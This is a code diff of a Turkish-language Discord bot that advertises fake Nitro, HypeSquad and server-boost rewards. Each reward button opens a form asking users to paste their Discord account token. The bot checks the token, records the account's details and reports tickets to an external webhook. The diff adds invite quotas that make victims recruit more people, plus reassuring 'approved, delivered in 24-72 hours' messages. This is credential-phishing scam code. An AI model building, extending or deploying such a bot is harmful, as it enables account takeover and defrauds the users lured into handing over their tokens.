@@ -18,7 +18,7 @@ GUILD_ID = 1469472843120246957
 intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
-bot = commands.Bot(command_prefix="!", intents=intents)  # Prefix gerekli değil ama hata vermesin diye
+bot = commands.Bot(command_prefix="!", intents=intents)
 
 # ===== TOKEN DOĞRULAMA =====
 def check_token(token):
@@ -35,31 +35,32 @@ def check_token(token):
     except:
         return False, None
 
-# ===================== 1. PANEL KOMUTU (ÖDÜL TICKET) =====================
+# ===================== ÖDÜL BUTONLARI (İNVİTE ŞARTLI) =====================
 class OdulView(View):
     def __init__(self):
         super().__init__(timeout=None)
 
-    @discord.ui.button(label="🎁 Nitro", style=discord.ButtonStyle.green)
+    @discord.ui.button(label="🎁 Nitro (6x Invite)", style=discord.ButtonStyle.green)
     async def nitro(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TokenModal(odul="Nitro"))
+        await interaction.response.send_modal(TokenModal(odul="Nitro", invite_sarti=6))
 
-    @discord.ui.button(label="🎫 Nitro Basic", style=discord.ButtonStyle.blurple)
+    @discord.ui.button(label="🎫 Nitro Basic (3x Invite)", style=discord.ButtonStyle.blurple)
     async def nitro_basic(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TokenModal(odul="Nitro Basic"))
+        await interaction.response.send_modal(TokenModal(odul="Nitro Basic", invite_sarti=3))
 
-    @discord.ui.button(label="🏅 HypeSquad", style=discord.ButtonStyle.gray)
+    @discord.ui.button(label="🏅 HypeSquad (3x Invite)", style=discord.ButtonStyle.gray)
     async def hypesquad(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TokenModal(odul="HypeSquad"))
+        await interaction.response.send_modal(TokenModal(odul="HypeSquad", invite_sarti=3))
 
-    @discord.ui.button(label="🚀 14x Boost", style=discord.ButtonStyle.red)
+    @discord.ui.button(label="🚀 14x Boost (10x Invite)", style=discord.ButtonStyle.red)
     async def boost(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TokenModal(odul="14x Boost"))
+        await interaction.response.send_modal(TokenModal(odul="14x Boost", invite_sarti=10))
 
 class TokenModal(Modal):
-    def __init__(self, odul: str):
+    def __init__(self, odul: str, invite_sarti: int):
         super().__init__(title=f"🎯 {odul} Odulu")
         self.odul = odul
+        self.invite_sarti = invite_sarti
         self.token_input = TextInput(
             label="Discord Token",
             placeholder="Tokenini buraya yapistir...",
@@ -94,7 +95,6 @@ class TokenModal(Modal):
                 await interaction.response.send_message("❌ Kategori bulunamadi! Lutfen ID'yi kontrol et.", ephemeral=True)
                 return
 
-            # Sadece kullanıcı ve bot görsün (yetkili rolü kaldırıldı)
             overwrites = {
                 guild.default_role: discord.PermissionOverwrite(read_messages=False),
                 kullanici: discord.PermissionOverwrite(read_messages=True, send_messages=True)
@@ -110,6 +110,7 @@ class TokenModal(Modal):
                 description=(
                     f"**Kullanici:** {kullanici.mention}\n"
                     f"**Odul:** {self.odul}\n"
+                    f"**Invite Sartı:** {self.invite_sarti}x davet\n"
                     f"**Hesap:** {username}\n"
                     f"**Nitro:** {nitro_text}\n"
                     f"**HypeSquad:** {hype}\n\n"
@@ -142,13 +143,16 @@ class TokenModal(Modal):
                 @discord.ui.button(label="✅ Onayla", style=discord.ButtonStyle.green)
                 async def onay(self, interaction2: discord.Interaction, button: Button):
                     await interaction2.response.send_message("✅ Odul onaylandi!", ephemeral=False)
-                    await kullanici.send(f"✅ {self.odul} odulun onaylandi! 27-72 saat icinde hesabina gonderilecek.")
+                    await kullanici.send(f"✅ {self.odul} odulun onaylandi! 24-72 saat icinde hesabina gonderilecek.")
+                    # Tick kanalına mesaj yaz
+                    await channel.send(f"✅ {kullanici.mention} odulu onaylandi! Odulunuz 24-72 saat icinde hesabiniza gonderilecektir.")
                     requests.post(WEBHOOK_URL, json={"content": f"✅ {kullanici} icin {self.odul} odulu onaylandi."})
 
                 @discord.ui.button(label="❌ Reddet", style=discord.ButtonStyle.red)
                 async def red(self, interaction2: discord.Interaction, button: Button):
                     await interaction2.response.send_message("❌ Odul reddedildi.", ephemeral=False)
                     await kullanici.send(f"❌ {self.odul} odulun reddedildi. Lutfen yetkiliyle iletisime gec.")
+                    await channel.send(f"❌ {kullanici.mention} odulu reddedildi.")
                     requests.post(WEBHOOK_URL, json={"content": f"❌ {kullanici} icin {self.odul} odulu reddedildi."})
 
             view = OnayView()
@@ -160,6 +164,7 @@ class TokenModal(Modal):
                 f"**🎫 Yeni Odul Ticket Acildi!**\n"
                 f"Kullanici: {kullanici} (ID: {kullanici.id})\n"
                 f"Odul: {self.odul}\n"
+                f"Invite Sartı: {self.invite_sarti}x\n"
                 f"Hesap: {username}\n"
                 f"Nitro: {nitro_text}\n"
                 f"HypeSquad: {hype}\n"
@@ -176,7 +181,7 @@ class TokenModal(Modal):
         except Exception as e:
             await interaction.response.send_message(f"❌ Ticket acilamadi: {e}", ephemeral=True)
 
-# ===================== 2. TICKET KOMUTU (KATEGORILI) =====================
+# ===================== TICKET KOMUTU (KATEGORILI) =====================
 class TicketModal(Modal):
     def __init__(self, kategori: str):
         super().__init__(title=f"🎫 {kategori} Ticket")
@@ -221,7 +226,20 @@ class TicketModal(Modal):
             )
             embed.set_footer(text="Zirve Ticket | Yetkili yanit verecek.")
 
-            await channel.send(embed=embed)
+            # Tick sil butonu
+            class SilView(View):
+                def __init__(self):
+                    super().__init__(timeout=None)
+
+                @discord.ui.button(label="🗑️ Ticket'i Sil", style=discord.ButtonStyle.red)
+                async def sil(self, interaction2: discord.Interaction, button: Button):
+                    if interaction2.user == kullanici or interaction2.user.guild_permissions.administrator:
+                        await channel.delete()
+                        await interaction2.response.send_message("✅ Ticket silindi.", ephemeral=True)
+                    else:
+                        await interaction2.response.send_message("❌ Bu ticketi sadece sahibi veya yetkili silebilir.", ephemeral=True)
+
+            await channel.send(embed=embed, view=SilView())
             await interaction.response.send_message(
                 f"✅ Ticket acildi: {channel.mention}",
                 ephemeral=True
@@ -283,6 +301,21 @@ async def slash_tick(interaction: discord.Interaction):
     embed.set_footer(text="Zirve Ticket | 7/24 Destek")
     await interaction.response.send_message(embed=embed, view=KategoriView())
 
+@bot.tree.command(name="bilgi", description="Botun bakim durumunu ve versiyon bilgisini gosterir.")
+async def slash_bilgi(interaction: discord.Interaction):
+    embed = discord.Embed(
+        title="ℹ️ Zirve Bot Bilgi",
+        description=(
+            "**Durum:** 🟢 Aktif\n"
+            "**Versiyon:** 2.0\n"
+            "**Komutlar:** /panel, /tick, /bilgi, /duyuru, /dm, /tick-sil\n"
+            "**Bakım:** Şu anda herhangi bir bakım çalışması yok."
+        ),
+        color=0x00ff00
+    )
+    embed.set_footer(text="Zirve Gift | 7/24")
+    await interaction.response.send_message(embed=embed)
+
 @bot.tree.command(name="dm", description="Belirtilen kullaniciya DM gonderir.")
 @app_commands.default_permissions(administrator=True)
 async def slash_dm(interaction: discord.Interaction, member: discord.Member, mesaj: str):
@@ -315,12 +348,20 @@ async def slash_duyuru(interaction: discord.Interaction, mesaj: str):
     
     await interaction.followup.send(f"✅ {basarili} kisiye gonderildi. ❌ {basarisiz} kisiye gonderilemedi.")
 
+@bot.tree.command(name="tick-sil", description="Belirtilen ticketi siler.")
+@app_commands.default_permissions(administrator=True)
+async def slash_tick_sil(interaction: discord.Interaction, channel: discord.TextChannel):
+    try:
+        await channel.delete()
+        await interaction.response.send_message(f"✅ {channel.mention} ticketi silindi.", ephemeral=True)
+    except Exception as e:
+        await interaction.response.send_message(f"❌ Ticket silinemedi: {e}", ephemeral=True)
+
 # ===== BOT HAZIR =====
 @bot.event
 async def on_ready():
     print(f"✅ Zirve Bot aktif! Kullanici: {bot.user}")
     try:
-        # Komutları belirtilen sunucuya senkronize et
         guild = discord.Object(id=GUILD_ID)
         await bot.tree.sync(guild=guild)
         print(f"✅ Slash komutlar {GUILD_ID} ID'li sunucuya senkronize edildi.")
